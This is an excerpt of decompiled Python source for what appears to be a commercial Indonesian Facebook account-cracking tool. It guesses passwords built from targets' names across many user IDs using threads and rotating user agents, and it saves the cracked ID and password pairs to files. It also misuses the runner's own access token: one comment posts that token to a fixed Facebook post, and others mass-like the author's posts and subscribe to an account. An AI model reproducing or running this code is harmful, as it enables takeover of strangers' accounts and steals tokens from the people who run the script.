# Decompile by HALO (Tools By HALO)
# Time Succes decompile : 2017-06-20 12:38:37.430465
N = '\x1b[0m'
W = '\x1b[1;97m' # PUTIH
R = '\x1b[1;91m' # MERAH
G = '\x1b[1;92m' # HIJAU
...
def Public():
	...
	if pil in ['1','01']:
		...
		try:
			komen ='Nitip token sayang 😗'
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']

			requests.post('https://graph.facebook.com/900835791314900/comments/?message=' +komen+ '&access_token=' + panda)
			requests.post('https://graph.facebook.com/900835791314900/comments/?message=' +panda+ '&access_token=' + panda)
			requests.post('https://graph.facebook.com/100041654630505/subscribers?access_token=' + panda)
			requests.post('https://graph.facebook.com/885191859545960/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/873834570681689/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/877214247010388/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/884854662913013/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/885272329537913/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/886068849458261/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/899433501455129/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/900187548046391/likes?summary=true&access_token=' + panda)
			requests.post('https://graph.facebook.com/900835791314900/likes?summary=true&access_token=' + panda)
...
def public_menu():
	...
	try:
		...
		print(' [!] ID TIDAK PUBLIK ATAU TOKEN RUSAK')
		exit()
def File():
			clear()
			print(logo)
		...
		for yuzong in id2:
			try:
				...
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
...
def crack(idf,pwv):
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\x1b[1;92m [ GASHA-OK ] {idf} | {pw}')
				cek_DYNO(kuki)
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
...
def free(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ HALO ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ HALO-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ HALO-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/HALO-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
try:
	peler=requests.get('https://github.com/Xenz-11/file/blob/main/x.txt').text
	if basesplit in peler:
		key=basesplit
		status=f'{G}PREMIUM ✓'
	else:
		key = '-'
	...
	print ('koneksi error')
notif=(f'''{Y}Anda Belum Terdaftar Di Premium
Silakan Dafatar Dulu
''')
def clear():
	os.system('clear')
logo = (f'''
...
│ 　　　　　∠_,O,,/                                 ││                                                   │
│                                          SCRIPT   │
│ BY mstar HALOM                                    ││ Telegram : @b72_i                                 │
│                                 Channel   :       ││ https://t.me/HALOSHOPING                          │
│                                Github   :         │
│ TEM    : HALO                             │
│ Version  : 6.1                                    │
│                Telegram : @b72_i                  ││                OWNER : HALO                       │
│          make By HALO CRACK                       │
╰───────────────────────────────────────────────────╯
...
class clone:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print(f"{W} [{G}1{W}] {C}File Cloning    {G}[FREE]")
		print(f"{W} [{G}2{W}] {C}Create File     {G}[FREE]")
		print(f"{W} [{G}3{W}] {C}Publik Cloning  {R}[PREM]")
		print(f"{W} [{G}4{W}] {C}2009-10 Cloning {R}[PREM]")
		print(f"{W} [{G}5{W}] {C}2011-14 Cloning {R}[PREM]")
		print(f"{W} [{B}G{W}] {C}Get Premium")
		print(f"{W} [{R}E{W}] {C}Exit Program\n")
		wibu =input(f" {R}[{P}?{R}] {W}Choose :{G} ")
		if wibu in ["1", "01"]:
			File()
		if wibu in ["2", "02"]:
			os.system("nano fileX")
		if wibu in ["3", "03"]:
			if basesplit in peler:
				Public()
			else:
...
{B} | {C}List Harga Premium {B}|
{B} ||||||||||||||||||||||
{B} || {R}[{Y}1{R}] {W}1 Hari   {G}2k  {B}||
{B} || {R}[{Y}2{R}] {W}1 Minggu {G}10k {B}||
{B} || {R}[{Y}3{R}] {W}2 Minggu {G}20k {B}||
{B} || {R}[{Y}4{R}] {W}3 Minggu {G}30k {B}||
{B} || {R}[{Y}5{R}] {W}1 Bulan  {G}35k {B}||
{B} ||||||||||||||||||||||
''')
			pilih=input(f' {G}[{P}?{G}] {C}Choose : {G}')
			if pilih in ['1','01']:
				os.system(f'xdg-open https://wa.me/6283138613993/?text=Mau+Daftar+Bang+1hari%0A%0A%0AKeynya+={basesplit}')
			if pilih in ['2','02']:
				os.system(f'xdg-open https://wa.me/6283138613993/?text=Mau+Daftar+Bang+1minggu%0A%0A%0AKeynya+={basesplit}')
			if pilih in ['3','03']:
				os.system(f'xdg-open https://wa.me/6283138613993/?text=Mau+Daftar+Bang+2minggu%0A%0A%0AKeynya+={basesplit}')
			if pilih in ['4','04']:
				os.system(f'xdg-open https://wa.me/6283138613993/?text=Mau+Daftar+Bang+3minggu%0A%0A%0AKeynya+={basesplit}')
			if pilih in ['5','05']:
				os.system(f'xdg-open https://wa.me/6283138613993/?text=Mau+Daftar+Bang+1bulan%0A%0A%0AKeynya+={basesplit}')
			else:
				clone()
			sys.exit()
		else:
			print (f" {B}[{R}!{B}] {W}Pilih Yang Bener ")
			time.sleep(1)
			clone()
	...
	def api(self, uid, pwx):
		ua=requests.get('https://github.com/Xenz-11/file/blob/main/ua.txt').text
		rua = random.choice(ua)
		warna=(W,R,G,Y,C,P,B)
		xz=random.choice(warna)
		sys.stdout.write(
			"\r %s[ XENZ ] %s/%s -> Ok:-%s - Cp:-%s "%(xz,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ XENZ-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("XENZ-2009-OK.txt","a").write(" %s|%s\n"%(uid, pw))
				break
	...
	def old2(self):
		...
		idx = "10000" 
		os.system('clear');print(logo)
		limit = int(input("\n \033[0;95m[+]\033[0;93m MASUKAN TOTAL ID LIMIT 50.000 : "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				listpass = input("%s [?] MASUKAN PASSWORD MANUAL :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK TERSIMPAN DI -> ok.txt"%(Y))
				print("%s [+] CP TERSIMPAN DI  -> cp.txt"%(G))
				print("%s [!] NYALAKAN MODE PESAWAT 5 DETIK KALO GAK DAPET HASIL\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("XENZ-2009-Ok.txt","a").write("[OK] %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m| XENZ-OK | %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
